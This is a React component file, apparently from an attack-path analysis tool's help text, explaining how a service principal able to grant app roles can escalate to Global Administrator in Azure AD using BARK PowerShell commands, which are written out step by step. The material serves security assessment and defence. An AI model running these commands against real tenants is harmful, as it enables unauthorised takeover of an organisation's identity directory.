import React from 'react';

const Abuse = () => {
    return (
        <>
            <p>
                With the ability to grant arbitrary app roles, you can grant 
                the RoleManagement.ReadWrite.Directory app role to a Service 
                Principal you already control, and then promote it or another 
                principal to Global Administrator.
            </p>

            <p>
                These functions require you to supply an MS Graph-scoped JWT 
                associated with the Service Principal that has the privilege 
                to grant app roles. There are several ways to
                acquire a JWT. For example, you may use BARK’s
                Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT
                by supplying a Service Principal Client ID and secret:
            </p>

                <pre>
                    <code>
                        {
                            '$MGToken = Get-MSGraphTokenWithClientCredentials `\n' +
                            '    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `\n' +
                            '    -ClientSecret "asdf..." `\n' +
                            '    -TenantName "contoso.onmicrosoft.com"'
                        }
                    </code>
                </pre>

            <p>
                Use BARK's Get-AllAzureADServicePrincipals to collect all 
                Service Principal objects in the tenant:
            </p>

                <pre>
                    <code>
                        {
                            '$SPs = Get-AllAzureADServicePrincipals `\n' +
                            '    -Token $MGToken'
                        }
                    </code>
                </pre>

            <p>
                Next, find the MS Graph Service Principal's ID. You can do this by 
                piping $SPs to Where-Object, finding objects where the appId value 
                matches the universal ID for the MS Graph Service Principal, which is 
                00000003-0000-0000-c000-000000000000:
            </p>

                <pre>
                    <code>
                        {
                            '$SPs | ?{$_.appId -Like "00000003-0000-0000-c000-000000000000"} | Select id'
                        }
                    </code>
                </pre>

            <p>
                The output will be the object ID of the MS Graph Service Principal. 
                Take that ID and use it as the "ResourceID" argument for BARK's 
                New-AppRoleAssignment function. The AppRoleID of '9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8' 
                is the universal ID for RoleManagement.ReadWrite.Directory. The 
                SPObjectId is the object ID of the Service Principal you want to grant 
                this app role to:
            </p>

                <pre>
                    <code>
                        {
                            'New-AppRoleAssignment `\n' +
                            '    -SPObjectId "6b6f9289-fe92-4930-a331-9575e0a4c1d8" `\n' +
                            '    -AppRoleID "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" `\n' +
                            '    -ResourceID "9858020a-4c00-4399-9ae4-e7897a8333fa" `\n' +
                            '    -Token $MGToken'
                        }
                    </code>
                </pre>

            <p>
                If successful, the output of this command will show you the App Role 
                assignment ID. Now that your Service Principal has the RoleManagement.ReadWrite.Directory 
                MS Graph app role, you can promote the Service Principal to Global Administrator 
                using BARK's New-AzureADRoleAssignment.
            </p>

                <pre>
                    <code>
                        {
                            'New-AzureADRoleAssignment `\n' +
                            '    -PrincipalID "6b6f9289-fe92-4930-a331-9575e0a4c1d8" `\n' +
                            '    -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `\n' +
                            '    -Token $MGToken'
                        }
                    </code>
                </pre>

            <p>
                If successful, the output will include the principal ID, the role ID, and a 
                unique ID for the role assignment.
            </p>
        </>
    );
};

export default Abuse;
